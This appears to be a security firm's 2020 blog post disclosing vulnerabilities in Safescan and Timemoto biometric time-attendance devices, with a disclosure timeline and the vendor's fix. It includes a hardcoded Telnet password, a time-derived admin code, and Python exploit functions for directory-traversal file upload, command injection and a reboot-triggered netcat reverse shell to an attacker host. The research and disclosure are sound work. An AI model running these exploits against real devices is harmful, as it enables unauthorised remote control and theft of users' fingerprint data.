  - [Forensic Readiness Planning](/services/incident-response/forensics-readiness-plan/)
  - [Gold Teaming](/services/incident-response/gold-teaming/)
  - [Malware Analysis & Reverse Engineering](/services/incident-response/malware-reverse-engineering/)
  - [Intrusion Analysis & Compromise Assessment](/services/incident-response/intrusion-analysis/)
  - [Incident Response Services](/services/incident-response/incident-response/)
  - [Incident Response Retainer](/services/incident-response/incident-response-retainer/)
  - [Technical Services Counter Measures (TSCM)](/services/incident-response/technical-services-counter-measures-tscm/)
  - [Forensic First Responder (FFR)](/services/training-and-knowledge-transfer/forensic-first-responder-ffr/)

  - Incident Response Information
  - [Introduction to Ransomware Protection](/services/incident-response-and-forensics/introduction-to-ransomware-protection/)
  - [Stolen Laptop Case Study](/services/stolen-laptop-case-study/)
  - [What is Cyber Security?](/cyber-security-glossary/cyber-security/)
  - Useful Pages
  - [Apply for corporate account.](/procheckup-corporate-account/)
  - [Talk to a cybersecurity expert.](/procheckup-cybersecuriy-expert/)
  - [Security Research.](/procheckup-labs/)
  - [ProCheckUp's Engagement Process.](/services/penetration-testing-and-security-audit/processes//)
  - [Portal access.](https://portal.procheckup.com/)
  - [Reporting access.](https://remote.procheckup.com)
* [Sectors](/industries/)

  ### [Sectors](/industries/)

  - [Central Government Sector](/industries/central-government/)
  - [Energy and Utilities Sector](/sectors/energy-and-utilities/)
  - [Financial Services Sector](/industries/financial-services-sector/)
  - [HealthCare Sector](/industries/healthcare-sector/)
  - [Local Government Sector](/industries/local-government-sector/)
  - [Manufacturing Sector](/sectors/manufacturing-sector/)
  - [Retail and E-Commerce Sector](/sectors/retail-and-e-commerce/)

  - Sectors Information
  - [CyberSecurity For Energy And Utilities](/sectors/cybersecurity-for-the-energy-and-utilities-sector)
  - [CyberSecurity For Financial Services](/sectors/cybersecurity-for-financial-services)
  - [CyberSecurity For Healthcare](/sectors/cybersecurity-for-healthcare/)
  - Useful Pages
  - [Apply for corporate account.](/procheckup-corporate-account/)
  - [Talk to a cybersecurity expert.](/procheckup-cybersecuriy-expert/)
  - [Security Research.](/procheckup-labs/)
  - [ProCheckUp's Engagement Process.](/services/penetration-testing-and-security-audit/processes//)
  - [Portal access.](https://portal.procheckup.com/)
  - [Reporting access.](https://remote.procheckup.com)
* [About Us](/about-us/)
  + [Company Information](/about-us/)
  + [Accreditations](/about-us/accreditations/)
  + [News](/news/)
  + [Blog](/blogs/)
  + [Careers & Team](/about-us/careers-team/)
  + [Privacy Policy](/about-us/privacy-policy/)
  + [Anti-Slavery Policy](/about-us/anti-slavery-policy/)
  + [Carbon Reduction Plan](/about-us/carbon-reduction-plan/)
* [Contact](/contact)

Saturday, 1 February 2020
by
Max de Dumast

# Remote Code Execution on Biometric IoT Devices

![](/media/jxrfugrx/iot_devices.webp)

Biometric devices, which use unique physical features of users to authenticate them, have long been considered by the wider public the ideal balance of usability and security. No villain worth his salt would imagine not having an iris scanner to protect their evil lair. Although the Infosec industry has shifted away from this sentiment, the public at large still puts disproportionate amounts of trust in biometric devices for security purposes.

This blog post provides an example of what can go wrong when biometric devices are improperly built.

## The device

---

Access to ProCheckUp’s offices is controlled by a Safescan TA-803. Having both a fingerprint reader and an RFID reader, the devive’s main purpose is time-attendance, however it also includes some access-control capabilities, by unlocking the door to authorised users. It can be remotely administered through a dedicated API or a web-service.

On a slow afternoon in the office, I was asked to have a look at the Safescan to see whether it is really as safe as advertised. After all, being a cybersecurity company we ought to be sure our environment is well protected both on- and offline. After a quick search on a popular online auction website I found a second-hand Safescan TA-8035 up for grabs. This second-hand device would allow me to test vulnerabilities that would apply to our own machine also.

## A time derived backdoor

---

Upon receiving the second-hand Safescan, I realised the previous owner hadn’t reset it to factory settings – leaving data of the previous users on the device and locked down with a password I did not know. When I couldn’t find instruction for a full factory reset in the device manual, I decided to contact Safescan directly. What followed was an almost surreal phone conversation: the customer service representative asked whether I really wanted to reset the device or simply wished to gain administrative access. I decided to follow this cue and ask for the latter. All I had to do was provide the time as displayed on the front panel of my second-hand device and the customer service representative provided an 8-digit code to type into the machine. Following this phone call, I quickly managed to find the exact algorithm used by the device online, posted by an Alibaba vendor in an FAQ section on a similar, but differently branded, device. I now had a reliable way to gain administrative access within a matter of seconds, although this still required physical access to the machine.

![](/media/wrkjjiug/alibaba_2.png?width=500&height=62.07674943566592)

## A default Telnet password

---

I connected my newly reset second-hand Safescan to an isolated network and found a few interesting ports:

```
PORT     STATE SERVICE       VERSION
23/tcp   open  telnet        BusyBox telnetd (SafeScan QTerm 1.0.4)
80/tcp   open  http          ZK Web Server (ZKSoftware ZEM500 fingerprint reader; MIPS)
81/tcp   open  http          ZK Web Server (ZKSoftware ZEM500 fingerprint reader; MIPS)
4360/tcp open  matrix_vnet?
4370/tcp open  elpro_tunnel?
```

The web service prompts for credentials, with the default being administrator with 123456 as a password.

![](/media/gqvp33uc/login_3.png?width=500&height=405.53745928338765)From the web interface, I was able to download a backup of the device's configuration. Looking at the downloaded file, I noticed what looks like a header prepended before a tar archive:

![](/media/p33hniw4/hex_dump_4.png?width=500&height=196.843853820598)

By removing the header, I was then able to extract the archive. Inside a file named Config.cfg, a variable called $Telnet with what looks like a password sticks out:

```
$ cat ZKConfig.cfg
### snip ###
$Telnet=z1k2t3e4c5h
IsSupportHttps=1
SSLPASS=123456
### snip ###
WirelessSSID=**CENSORED**
WirelessKey=**CENSORED**
ialNumber=**CENSORED**
WirelessMode=0
WirelessAuth=2
WirelessEnc=1
```

I also found the password for the web service and the wireless credentials stored clearly in this text. Looking at the /etc/init.d/rcS boot script that is used to launch all the services running on the device it appears the developers wanted to ensure that this password would remain, even if the password was changed from that default value by the user . The code doesn't work because the USERDATAPATH variable has a trailing slash.

```
if [ -f $USERDATAPATH/passwd ]; then
        mv $USERDATAPATH/passwd  /etc/passwd
fi
```

This is particularly egregious - why would Safescan want to force this password onto their users? We can only posture that this was intended to be disabled once shipped out to users or kept for servicing purposes. Neither reason warrants forcing a default, unchangeable Telnet password on customers. This feature has been disabled on the newer generation of Safescan devices, leading me to wishfully believe it is a simple mistake.

I continued exploring the filesystem further and found an image file called finger1.bmp. This turned out to be a picture file of the latest fingerprint to have been scanned – particularly troubling for a biometric device claiming this is not possible in its support pages, doubly so when considering the overall security of the device and the fact that unlike passwords, our fingerprints cannot be changed.

![](/media/b0ghz5ih/claim_5_1.png?width=500&height=348.7654320987654)

## Remote code execution

---

Emboldened by these findings I wanted to dig deeper and see if it was possible to gain remote code execution even with the root password having been changed. Given what I’d seen so far, I had little reason to doubt the possibility.

In a first step, I focussed on the API service running on port 4360, which runs by default and also exists on newer iterations of the product (e.g. the Timemoto TM-616, which is also affected by the vulnerabilities described below and sold by Safescan).

Initially, I simply extracted the binary and started looking at the documentation which revealed a number of interesting calls. However, the documentation lacked several key elements that would enable me to write a functioning exploit and would have forced me to fuzz the application.

In order to move forward nonetheless I started decompiling the binary using Ghidra, before Googling a few of the strings in the binary. Only when I searched Github directly for these did I find the complete source code for the firmware in multiple repositories. While this significantly facilitated exploitation, it isn't a requirement.

![](/media/ynnajkyn/github_6.png?width=511&height=300&mode=max)

A few interesting functions caught my attention.

### CMD\_READ\_FILE

As its name suggests, it allows users to retrieve files via the API. I wouldn't even call this an exploit as the method will simply return any file requested, however I did make heavy use of it when attacking the Timemoto TM-616, as I will discuss later. Certainly a vulnerability however, as you can see for yourself below.

![](/media/4e5ngz5b/get_passwd_7.png?width=500&height=82.07674943566592)

### CMD\_UPDATEFILE

The relevant portions of code handling requests for this method is shown below:

```
        case CMD_UPDATEFILE:
          {
                  char sTmp[40];
                  char sTmp1[10];
                  memset(sTmp,0,40);
                  memset(sTmp1,0,10);
                  memcpy(sTmp, p+4, sizeof(sTmp));
                  // snip
                  if (strstr(sTmp, ".jpg")) {
                      // snip
                  } else {
                          GetEnvFilePath("USERDATAPATH", sTmp, sFileName);
                  }
                  // snip
                  A=1;
                  break;
            }
```
```
char *GetEnvFilePath(const char *EnvName, const char *filename, char *fullfilename)
{
        if (getenv(EnvName))
                sprintf(fullfilename, "%s%s", getenv(EnvName), filename);
        else
                sprintf(fullfilename, "%s", filename);
        return fullfilename;
}
```

Now this one is interesting. Simply put, it allows me to upload any file to any location, as the service is running as root, the only user on the device. While the method attempts to only allow firmware files to be uploaded, a simple directory traversal easily takes care of that. Armed with this knowledge, writing an exploit was rather trivial. A portion of the relevant exploit code is shown below:

```
def do_write_file(self, line):
    if not len(line) or len(line.split(' ')) != 2:
        print("[*] Usage: do_write_file <file> <dest>")
        return True
    file = line.split(' ')[0]
    dest = line.split(' ')[1]
    if dest[0] != '/':
        dest = '/' + dest
    dest_final = "../../.." + dest + '\x00\x00\x00'
    try:
        print("[-] Creating {}".format(file))
        with open(file, 'r') as fp:
            payload = fp.read()
        # prepare data
        self.z.send_command(1500, struct.pack('<II', len(payload), len(payload))) # CMD_PREPARE_DATA
        self.z.recv_reply()
        # send data
        self.z.send_command(1501, payload.encode()) # CMD_DATA
        self.z.recv_reply()
        # apply data
        data = bytearray()
        data.extend(struct.pack('<I', 1700)) # CMD_UPDATE_FILE
        data.extend(dest_final.encode())
        self.z.send_command(110, data)
        self.z.recv_reply()
    except Exception:
        traceback.print_exc()
```

With the ability to get any file using the CMD\_READ\_FILE command, I could read the init scripts and see what to upload and where to gain remote code execution. For the TA-8035, I wrote the following "all-in-one" command to gain code execution:

```
def do_auto_pwn_ta(self, line):
    """Writes a test.sh file to the device which will be executed and deleted at reboot by the TA device"""
    if not len(line) or len(line.split(':')) != 2:
        print("[*] Usage: write_file_pwn <LHOST:LPORT>")
        return True
    try:
        print("[-] Creating test.sh")
        payload = "(sleep 60 && nc {} -e /bin/sh)&".format(line)
        filename = "test.sh\x00"
        # prepare data
        print("[-] Preparing payload")
        self.z.send_command(1500, struct.pack('<II', len(payload), len(payload)))
        self.z.recv_reply()
        # send data
        print("[-] Sending payload")
        self.z.send_command(1501, payload.encode())
        self.z.recv_reply()
        # apply data
        print("[-] Saving payload")
        data = bytearray()
        data.extend(struct.pack('<I', 1700))
        data.extend(filename.encode())
        self.z.send_command(110, data)
        self.z.recv_reply()
        time.sleep(1)
        print("[-] Sending reboot command")
        self.z.restart()
        print("[+] Done. Device will reboot now.\nTo catch shell: nc -nlvp {}".format(line.split(':')[1]))
    except Exception:
        traceback.print_exc()
```

Using the same method as above, but tailored to the device, I uploaded a test.sh file to the /mnt/mtdblock/data directory, which was executed and conveniently deleted by the device at boot, as scripted below:

/etc/init.d/rcS:

```
if [ -f $USERDATAPATH/auto.sh ]; then
        #start delegate and inotify
        /etc/start_delegate.sh &
        . $USERDATAPATH/auto.sh
fi
```

auto.sh:

```
if [ -f $DEST/test.sh ]; then
        cd $DEST && chmod u+x $DEST/test.sh && $DEST/test.sh
        rm test.sh
fi
```

To exploit the Timemoto TM-616, I simply downloaded the rcS file and patched it to start the telnet service. After cracking the shadow file, downloaded via the CMD\_READ\_FILE method, I was able to log in. The password was solokey and while I cannot praise the choice of password, I must also state there was originally no way to log in.

## More?

---

Yes! As some may have noticed, not only does the CMD\_UPLOAD\_FILE method function case (the function is over 2,500 lines long) not sanitise for directory traversal, it also fails to protect against command injection. This snippet shows how to exploit it:

```
def do_command_exec(self, line):
    """Extremely iffy. Prefer write file method. Massive memory leaks and bounds checking issues make this method unstable and risk crashing target."""
    if not len(line):
        print("[*] Usage: command_exec <cmd>\n[*] Output will not be returned, but you could write to a file and get it afterwards. Busybox nc does not have -e option\n")
        return True
    try:
        # prepare data
        self.z.send_command(1500, struct.pack('<II', 1, 1))
        self.z.recv_reply()
        # send data
        self.z.send_command(1501, 'a'.encode())
        self.z.recv_reply()
        # apply data
        data = bytearray()
        data.extend(struct.pack('<I', 1700))
        payload = '; ' + line + '; echo \x00\x00'
        data.extend(payload.encode())
        self.z.send_command(110, data)
        self.z.recv_reply()
    except Exception:
        traceback.print_exc()
```

However due to lacklustre memory management and the use of C, I had a hard time getting this to work consistently and had better luck using the method described earlier.

If you thought that was it, think again, it doesn’t stop here. Digging deeper, I also noticed the API is vulnerable to SQL injections but unfortunately I lost my notes on this vector. As the device was running sqlite and prevented stacked queries, I couldn't get code execution this way anyhow.

I'm also sure there is a few buffer overflow vectors in there, however exploiting these would be overkill given the methods I already had to gain access to the devices.

## Conclusion

---

There's surely a number of conclusions one could reach after reading this, however, what I desperately want to stress is that security needs to be designed into the product from its very inception. A responsible disclosure point of contact would have been greatly beneficial to Safescan, its customers and myself. It took six months for me to even succeed at getting an answer from the vendor, as they initially discarded my messages as an attempted scam, which I understand.

I have also learned a lot from the process and, reflecting, there are a number of ways disclosure processes ought to be improved.

As cybersecurity experts, we have an odd relationship with vendors: we report issues in their products to them, but we must do more to help them understand what we are doing and why we are doing it. We must understand the point of view of the vendor, who didn't ask for their devices to be hacked. While we understand that they are lucky we did, we cannot expect immediate gratification and must accept their scepticism and remonstrances and most importantly take the time to explain the necessity of our actions.

### Timeline:

* Initial disclosure: 02/11/2018
* Response: 17/05/2019
* Technical disclosure: 06/06/2019
* Fix released: 08/2019

### PoC:

<https://github.com/ProCheckUp/SafeScan>

 [Security](/blogs?catid=1401)

 [Share on Twitter](https://twitter.com/share?url=https://www.procheckup.com/blogs/posts/2020/february/remote-code-execution-on-biometric-iot-devices/)

 [Share on Facebook](https://facebook.com/sharer.php?u=https://www.procheckup.com/blogs/posts/2020/february/remote-code-execution-on-biometric-iot-devices/)

[Share on LinkedIn](http://www.linkedin.com/shareArticle?mini=true&url=https://www.procheckup.com/blogs/posts/2020/february/remote-code-execution-on-biometric-iot-devices/)

 [Share on Pinterest](http://pinterest.com/pin/create/button/?url=https://www.procheckup.com/blogs/posts/2020/february/remote-code-execution-on-biometric-iot-devices/)

### Max de Dumast

## Article Author

Max de Dumast

## Categories

* [Compliance](/blogs?catid=1399)
* [Malware](/blogs?catid=1400)
* [Security](/blogs?catid=1401)
* [Charity](/blogs?catid=1402)
* [GDPR](/blogs?catid=1403)
* [Forensics](/blogs?catid=1404)
* [Social Engineering](/blogs?catid=2162)
* [Technology](/blogs?catid=2180)
* [Cyber Security](/blogs?catid=2353)
* [Training and Learning](/blogs?catid=2354)
* [PCI DSS](/blogs?catid=2355)
* [Artificial Intelligence](/blogs?catid=2356)
* [SME](/blogs?catid=2357)
* [Governance, Risk, and Compliance](/blogs?catid=2358)

## Recent Posts

![](/media/jxrfugrx/iot_devices.webp)
### [Remote Code Execution on Biometric IoT Devices](/blogs/posts/2020/february/remote-code-execution-on-biometric-iot-devices/)

![](/media/jiolxn3j/cloud-computing-2001090_1920.jpg)
### ["Cloudbusters" - How Hackers Access Cloud Data?](/blogs/posts/2020/february/cloudbusters-how-hackers-access-cloud-data/)

## Authors

* [ProCheckUp](/blogs?author=1405)
* [Paul Bissette](/blogs?author=1406)
* [Thomas Rusbridger](/blogs?author=1407)
* [Procheckup Team](/blogs?author=1408)
* [Richard Brain](/blogs?author=1409)
* [Guy Newman](/blogs?author=1410)
* [Dimitrios Fragkiskatos](/blogs?author=1411)
* [Max de Dumast](/blogs?author=1412)
* [Nga Hoang](/blogs?author=1413)
* [David Shanahan](/blogs?author=1414)
* [Edd Jones](/blogs?author=1415)
* [David Tyler](/blogs?author=1416)
* [Connor Cracknell](/blogs?author=1417)
* [Cristian Ciomaga](/blogs?author=1418)
* [Wei Hou Low](/blogs?author=2161)
* [Brendan Yeo](/blogs?author=2181)
* [Daniel Byrne](/blogs?author=2352)
* [Rebecca Dunlop](/blogs?author=4136)
* [Sean Then](/blogs?author=4364)

## Contact Us Today!

If you would like to learn more about ProCheckUp, our capabilities, and services then please contact us by completing the form below.

What are you contacting us for?

Security Audit/Penetration Testing

PCI DSS

ISO 27001

GDPR

Incident response

Training

Other -please specify in Message

The ' Name' field is required

The 'Phone' field is required

The 'Email' field is required
Please enter a valid Email address

Send Message

### Contact Us

ProCheckUp14 & 15 St. George’s Square, Portsmouth, PO1 3EZ

+44 (0) 20 7612 7777

info@procheckup.com


